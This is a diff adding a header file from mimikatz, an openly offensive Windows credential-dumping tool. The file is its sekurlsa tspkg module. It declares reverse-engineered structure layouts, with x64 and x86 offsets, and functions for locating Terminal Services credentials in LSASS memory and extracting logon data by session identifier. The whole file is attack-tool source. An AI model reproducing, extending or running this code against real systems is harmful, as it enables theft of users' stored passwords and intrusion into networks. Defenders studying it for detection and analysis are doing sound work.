@@ -1,0 +1,48 @@
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
+	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
+*/
+#pragma once
+#include "../mod_mimikatz_sekurlsa.h"
+
+class mod_mimikatz_sekurlsa_tspkg {
+
+private:
+	typedef struct _KIWI_TS_PRIMARY_CREDENTIAL {
+		PVOID unk0;	// lock ?
+		KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
+	} KIWI_TS_PRIMARY_CREDENTIAL, *PKIWI_TS_PRIMARY_CREDENTIAL;
+
+	typedef struct _KIWI_TS_CREDENTIAL {
+	#ifdef _M_X64
+		BYTE unk0[0x88];
+	#elif defined _M_IX86
+		BYTE unk0[0x50];
+	#endif
+		PKIWI_TS_PRIMARY_CREDENTIAL pTsPrimary;
+	} KIWI_TS_CREDENTIAL, *PKIWI_TS_CREDENTIAL;
+
+	typedef struct _KIWI_TS_CREDENTIAL_AVL_SEARCH {
+	#ifdef _M_X64
+		BYTE unk0[108];
+	#elif defined _M_IX86
+		BYTE unk0[64];
+	#endif
+		LUID LocallyUniqueIdentifier;
+	#ifdef _M_X64
+		BYTE unk1[46];
+	#elif defined _M_IX86
+		BYTE unk1[16];
+	#endif
+	} KIWI_TS_CREDENTIAL_AVL_SEARCH, *PKIWI_TS_CREDENTIAL_AVL_SEARCH;
+
+	static PRTL_AVL_TABLE TSGlobalCredTable;
+	static bool searchTSPKGFuncs();
+
+public:
+	static mod_process::PKIWI_MODULEENTRY32 pModTSPKG;
+	static bool getTsPkg(vector<wstring> * arguments);
+	static bool WINAPI getTsPkgLogonData(__in PLUID logId, __in bool justSecurity);
+};
